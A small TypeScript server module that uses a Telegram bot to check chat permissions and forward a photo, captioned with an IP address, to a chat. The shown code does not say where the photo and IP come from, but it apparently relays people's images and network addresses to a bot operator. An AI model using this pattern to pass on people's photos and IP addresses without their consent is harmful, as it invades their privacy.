"use server";

import { InputFile } from "grammy";
import { bot } from "~/bot";

export async function getPermissions(chatId: number) {
	try {
		const botUser = await bot.api.getMe();
		const chatMember = await bot.api.getChatMember(chatId, botUser.id);

		if (chatMember.status !== "restricted") {
			return true;
		}

		if (chatMember.can_send_photos) {
			return true;
		}

		console.error(`Bot can't send photos to chat ${chatId}`);
		return false;
	} catch (err) {
		console.error("Failed to get chat:", err);
		return null;
	}
}

interface SendDataToBotParams {
	photo: string;
	chatId: number;
	ip: string;
}

export async function sendDataToBot({ photo, chatId, ip }: SendDataToBotParams) {
	const blob = await fetch(photo).then((res) => res.blob());
	try {
		await bot.api.sendPhoto(chatId, new InputFile(Buffer.from(await blob.arrayBuffer())), {
			caption: `IP: ${ip}\n` + "Device Type: unknown\n\n",
		});
	} catch (err) {
		console.error("Failed to send photo:", err);
	}
}
